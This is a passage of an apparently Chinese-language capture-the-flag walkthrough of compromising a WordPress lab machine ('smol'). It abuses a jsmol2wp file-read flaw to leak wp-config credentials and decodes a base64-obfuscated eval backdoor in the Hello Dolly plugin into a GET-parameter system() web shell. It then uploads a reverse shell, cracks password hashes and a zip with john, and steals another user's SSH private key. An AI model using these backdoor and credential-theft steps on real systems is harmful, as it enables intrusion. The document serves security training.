<p>我使用文件读取漏洞去读取<code>wp-config.php</code>文件在里面找到了一个数据库账号和密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wpuser&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;kbLSF2Vop#lw3rjDZ629*Z%G&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The database collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>WordPress网站中同样有一个<code>wpuser</code>用户</p>
<p>然后我就尝试使用这个密码来登录WordPress</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031721838.png" alt="image-20250303172103611"></p>
<p>登录进来以后发现<code>wpuser</code>貌似只是一个普通的用户</p>
<p>没有我想要的编辑插件&#x2F;主题的源代码的功能</p>
<p>然后暂时我简单的测试了一下文件上传功能没有什么进展之后，我就在这个方向上就没有什么思路了</p>
<p>我又在即将目光放在<code>jsmol2wp</code>的漏洞上</p>
<p>我了解到这个版本的<code>jsmol2wp</code>还存在一个<code>SSRF</code>漏洞</p>
<p>于是我就尝试了一下拿<code>Gopher</code>协议来攻击<code>MySQL</code>数据库从而给网站写木马</p>
<p>很遗憾我没有成功</p>
<p>后来我在一个<code>Webmaster Tasks!!</code>的贴子上发现了一点信息</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031738209.png" alt="image-20250303172708599"></p>
<p>说要排查存在后面的插件<code>Hello Dolly</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop]</span><br><span class="line">└─# dirsearch -u &quot;http://www.smol.hmv/&quot; -w SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                             </span><br><span class="line">                                                                                                                                                    </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 13370</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/Desktop/reports/http_www.smol.hmv/__25-03-03_04-29-49.txt</span><br><span class="line"></span><br><span class="line">Target: http://www.smol.hmv/</span><br><span class="line"></span><br><span class="line">[04:29:49] Starting:                                                                                                                                </span><br><span class="line">[04:29:52] 200 -    0B  - /wp-content/plugins/akismet/                      </span><br><span class="line">[04:30:15] 500 -    0B  - /wp-content/plugins/hello.php                     </span><br><span class="line">[04:30:15] 500 -    0B  - /wp-content/plugins/hello.php/              </span><br></pre></td></tr></table></figure>

<p>我又对网站目录FUZZ了一遍 </p>
<p>发现了<code>hello.php</code>的存在</p>
<p>我再次使用<code>jsmol2wp</code>的漏洞</p>
<p>读取了<code>hello.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> Hello_Dolly</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.7.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: Hello Dolly</span></span><br><span class="line"><span class="comment">Plugin URI: http://wordpress.org/plugins/hello-dolly/</span></span><br><span class="line"><span class="comment">Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from &lt;cite&gt;Hello, Dolly&lt;/cite&gt; in the upper right of your admin screen on every page.</span></span><br><span class="line"><span class="comment">Author: Matt Mullenweg</span></span><br><span class="line"><span class="comment">Version: 1.7.2</span></span><br><span class="line"><span class="comment">Author URI: http://ma.tt/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_dolly_get_lyric</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="comment">/** These are the lyrics to Hello Dolly */</span></span><br><span class="line">	<span class="variable">$lyrics</span> = <span class="string">&quot;Hello, Dolly</span></span><br><span class="line"><span class="string">Well, hello, Dolly</span></span><br><span class="line"><span class="string">It&#x27;s so nice to have you back where you belong</span></span><br><span class="line"><span class="string">You&#x27;re lookin&#x27; swell, Dolly</span></span><br><span class="line"><span class="string">I can tell, Dolly</span></span><br><span class="line"><span class="string">You&#x27;re still glowin&#x27;, you&#x27;re still crowin&#x27;</span></span><br><span class="line"><span class="string">You&#x27;re still goin&#x27; strong</span></span><br><span class="line"><span class="string">I feel the room swayin&#x27;</span></span><br><span class="line"><span class="string">While the band&#x27;s playin&#x27;</span></span><br><span class="line"><span class="string">One of our old favorite songs from way back when</span></span><br><span class="line"><span class="string">So, take her wrap, fellas</span></span><br><span class="line"><span class="string">Dolly, never go away again</span></span><br><span class="line"><span class="string">Hello, Dolly</span></span><br><span class="line"><span class="string">Well, hello, Dolly</span></span><br><span class="line"><span class="string">It&#x27;s so nice to have you back where you belong</span></span><br><span class="line"><span class="string">You&#x27;re lookin&#x27; swell, Dolly</span></span><br><span class="line"><span class="string">I can tell, Dolly</span></span><br><span class="line"><span class="string">You&#x27;re still glowin&#x27;, you&#x27;re still crowin&#x27;</span></span><br><span class="line"><span class="string">You&#x27;re still goin&#x27; strong</span></span><br><span class="line"><span class="string">I feel the room swayin&#x27;</span></span><br><span class="line"><span class="string">While the band&#x27;s playin&#x27;</span></span><br><span class="line"><span class="string">One of our old favorite songs from way back when</span></span><br><span class="line"><span class="string">So, golly, gee, fellas</span></span><br><span class="line"><span class="string">Have a little faith in me, fellas</span></span><br><span class="line"><span class="string">Dolly, never go away</span></span><br><span class="line"><span class="string">Promise, you&#x27;ll never go away</span></span><br><span class="line"><span class="string">Dolly&#x27;ll never go away again&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Here we split it into lines.</span></span><br><span class="line">	<span class="variable">$lyrics</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;\n&quot;</span>, <span class="variable">$lyrics</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// And then randomly choose a line.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">wptexturize</span>( <span class="variable">$lyrics</span>[ <span class="title function_ invoke__">mt_rand</span>( <span class="number">0</span>, <span class="title function_ invoke__">count</span>( <span class="variable">$lyrics</span> ) - <span class="number">1</span> ) ] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This just echoes the chosen line, we&#x27;ll position it later.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_dolly</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=&#x27;</span>));</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$chosen</span> = <span class="title function_ invoke__">hello_dolly_get_lyric</span>();</span><br><span class="line">	<span class="variable">$lang</span>   = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="string">&#x27;en_&#x27;</span> !== <span class="title function_ invoke__">substr</span>( <span class="title function_ invoke__">get_user_locale</span>(), <span class="number">0</span>, <span class="number">3</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$lang</span> = <span class="string">&#x27; lang=&quot;en&quot;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">printf</span>(</span><br><span class="line">		<span class="string">&#x27;&lt;p id=&quot;dolly&quot;&gt;&lt;span class=&quot;screen-reader-text&quot;&gt;%s &lt;/span&gt;&lt;span dir=&quot;ltr&quot;%s&gt;%s&lt;/span&gt;&lt;/p&gt;&#x27;</span>,</span><br><span class="line">		<span class="title function_ invoke__">__</span>( <span class="string">&#x27;Quote from Hello Dolly song, by Jerry Herman:&#x27;</span> ),</span><br><span class="line">		<span class="variable">$lang</span>,</span><br><span class="line">		<span class="variable">$chosen</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now we set that function up to execute when the admin_notices action is called.</span></span><br><span class="line"><span class="title function_ invoke__">add_action</span>( <span class="string">&#x27;admin_notices&#x27;</span>, <span class="string">&#x27;hello_dolly&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// We need some CSS to position the paragraph.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dolly_css</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">	&lt;style type=&#x27;text/css&#x27;&gt;</span></span><br><span class="line"><span class="string">	#dolly &#123;</span></span><br><span class="line"><span class="string">		float: right;</span></span><br><span class="line"><span class="string">		padding: 5px 10px;</span></span><br><span class="line"><span class="string">		margin: 0;</span></span><br><span class="line"><span class="string">		font-size: 12px;</span></span><br><span class="line"><span class="string">		line-height: 1.6666;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	.rtl #dolly &#123;</span></span><br><span class="line"><span class="string">		float: left;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	.block-editor-page #dolly &#123;</span></span><br><span class="line"><span class="string">		display: none;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	@media screen and (max-width: 782px) &#123;</span></span><br><span class="line"><span class="string">		#dolly,</span></span><br><span class="line"><span class="string">		.rtl #dolly &#123;</span></span><br><span class="line"><span class="string">			float: none;</span></span><br><span class="line"><span class="string">			padding-left: 0;</span></span><br><span class="line"><span class="string">			padding-right: 0;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	&lt;/style&gt;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_action</span>( <span class="string">&#x27;admin_head&#x27;</span>, <span class="string">&#x27;dolly_css&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>在<code>hello_dolly()</code>函数中后一个后门</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p><code>base64</code>解码之后就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>])) &#123; <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]); &#125;</span><br></pre></td></tr></table></figure>

<p>但是他的触发条件是<code>add_action( &#39;admin_notices&#39;, &#39;hello_dolly&#39; );</code></p>
<p>当触发<code>admin_notices</code>的时候就会执行这个函数</p>
<p>我们使用 <code>wpuser</code>用户进入后台的时候刚好有一个<code>admin_notices</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031739403.png" alt="image-20250303173937312"></p>
<p>尝试在这个页面执行命令</p>
<p>执行成功</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031740776.png" alt="image-20250303174003563"></p>
<p>然后我上传了一个<code>shell.php</code>文件用于反弹shell</p>
<p>一个<code>sql.php</code>用来从数据库中查询出所用的用户名与密码</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031741845.png" alt="image-20250303174113638"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿LAPTOP-40PQI58C)-[~/Desktop]</span><br><span class="line">└─# john passwd --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 for all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">sandiegocalifornia (?)</span><br><span class="line">hero_gege@hotmail.com (?)</span><br><span class="line">2g 0:00:19:33 DONE (2025-03-02 21:39) 0.001704g/s 12226p/s 56527c/s 56527C/s !!!@@@!!!..*7¡Vamos!</span><br><span class="line">Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>

<p>破解出了diego与gege的密码</p>
<p>同时这个密码也是<code>diego</code>的ssh密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@smol:/var/www/wordpress/wp-admin$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@smol:/var/www/wordpress/wp-admin$ su diego</span><br><span class="line">su diego</span><br><span class="line">Password: sandiegocalifornia</span><br><span class="line">whoami</span><br><span class="line">diego</span><br></pre></td></tr></table></figure>

<p><code>user‘s flag</code>就在<code>diego</code>的<code>home</code>目录下</p>
<p>我尝试了使用密码登录<code>ssh</code></p>
<p>但是<code>diego</code> <code>gege</code> <code>think</code> <code>xavi</code></p>
<p>这四个用户都被禁止远程用密码登录</p>
<p>我在diego的home目录下面写了一个ssh 公钥然后成功用ssh登录进去了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh diego@192.168.56.110 </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon 03 Mar 2025 05:48:15 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.01              Processes:                194</span><br><span class="line">  Usage of /:   57.2% of 9.75GB   Users logged in:          0</span><br><span class="line">  Memory usage: 32%               IPv4 address for enp0s17: 192.168.56.110</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="line"></span><br><span class="line">162 updates can be applied immediately.</span><br><span class="line">125 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Mar  2 21:58:36 2025 from 192.168.56.103</span><br><span class="line">diego@smol:~$ whoami</span><br><span class="line">diego</span><br><span class="line">diego@smol:~$ </span><br></pre></td></tr></table></figure>

<p><code>diego</code> <code>gege</code> <code>think</code> <code>xavi</code>这个四个用户都在一个组里面 可以互相访问各自的home目录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diego@smol:/home$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  6 root  root     4096 Aug 16  2023 .</span><br><span class="line">drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..</span><br><span class="line">drwxr-x---  4 diego internal 4096 Mar  2 22:19 diego</span><br><span class="line">drwxr-x---  7 gege  internal 4096 Mar  2 22:45 gege</span><br><span class="line">drwxr-x---  5 think internal 4096 Jan 12  2024 think</span><br><span class="line">drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi</span><br><span class="line">diego@smol:/home$ </span><br></pre></td></tr></table></figure>

<p><code>think</code>用户的<code>home</code>目录有一个<code>.ssh</code>目录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diego@smol:/home/think$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-x--- 5 think internal 4096 Jan 12  2024 .</span><br><span class="line">drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..</span><br><span class="line">lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout</span><br><span class="line">-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc</span><br><span class="line">drwx------ 2 think think    4096 Jan 12  2024 .cache</span><br><span class="line">drwx------ 3 think think    4096 Aug 18  2023 .gnupg</span><br><span class="line">-rw-r--r-- 1 think think     807 Jun  2  2023 .profile</span><br><span class="line">drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh</span><br><span class="line">lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -&gt; /dev/null</span><br><span class="line">diego@smol:/home/think$ ls -al .ssh/</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 think think    4096 Jun 21  2023 .</span><br><span class="line">drwxr-x--- 5 think internal 4096 Jan 12  2024 ..</span><br><span class="line">-rwxr-xr-x 1 think think     572 Jun 21  2023 authorized_keys</span><br><span class="line">-rwxr-xr-x 1 think think    2602 Jun 21  2023 id_rsa</span><br><span class="line">-rwxr-xr-x 1 think think     572 Jun 21  2023 id_rsa.pub</span><br><span class="line">diego@smol:/home/think$ </span><br></pre></td></tr></table></figure>

<p><code>diego</code>用户对他有<code>r</code>权限</p>
<p>然后我就读取了<code>think</code>用户的私钥</p>
<p>然后ssh远程登录think</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ssh -i id_rsa think@192.168.56.110</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon 03 Mar 2025 05:52:14 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.02              Processes:                203</span><br><span class="line">  Usage of /:   57.2% of 9.75GB   Users logged in:          1</span><br><span class="line">  Memory usage: 33%               IPv4 address for enp0s17: 192.168.56.110</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="line"></span><br><span class="line">162 updates can be applied immediately.</span><br><span class="line">125 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Mon Mar  3 15:54:04 2025 from 192.168.56.103</span><br><span class="line">think@smol:~$ </span><br></pre></td></tr></table></figure>

<p>成功登录但是<code>think</code> 执行<code>sudo -l</code>的时候需要输入密码</p>
<p>我不知道<code>think</code>的密码</p>
<p>当我没有什么思路的时候我无意间使用<code>think</code>的身份执行了一次<code>su gege</code>的命令</p>
<p>发现无需输入密码成功切换到<code>gege</code>用户身份</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">think@smol:~$ su gege</span><br><span class="line">gege@smol:/home/think$ whoami</span><br><span class="line">gege</span><br><span class="line">gege@smol:/home/think$ </span><br></pre></td></tr></table></figure>

<p><code>gege</code>用户的<code>home</code>目录下有一个<code>wordpress.old.zip</code>文件</p>
<p>但是解压它需要密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gege@smol:~$ ls</span><br><span class="line">wordpress.old.zip</span><br><span class="line">gege@smol:~$ ls</span><br><span class="line">wordpress.old.zip</span><br><span class="line">gege@smol:~$ unzip wordpress.old.zip </span><br><span class="line">Archive:  wordpress.old.zip</span><br><span class="line">   creating: wordpress.old/</span><br><span class="line">[wordpress.old.zip] wordpress.old/wp-config.php password: </span><br></pre></td></tr></table></figure>

<p>我复制一份到到我的kali上面 使用john破解</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# john wordpress  --show</span><br><span class="line">wordpress.old.zip:hero_gege@hotmail.com::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>

<p>将其解压之后。</p>
<p>在它的<code>wp-config</code>文件中发现了<code>xavi</code>的密码</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031807802.png" alt="image-20250303180752375"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>su</code>切换到<code>xavi</code>用户后，执行<code>sudo -l</code></p>
